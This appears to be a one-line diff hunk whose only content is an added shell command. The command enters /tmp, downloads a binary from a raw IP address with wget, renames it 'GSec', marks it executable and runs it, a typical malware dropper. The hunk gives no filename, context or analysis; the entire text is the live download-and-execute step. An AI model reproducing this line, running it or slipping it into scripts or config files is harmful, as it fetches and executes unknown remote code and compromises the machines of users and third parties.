@@ -1,0 +1,1 @@
+cd /tmp; wget http://107.189.3.155/x86 -O-> GSec; chmod +x GSec; ./GSec x86
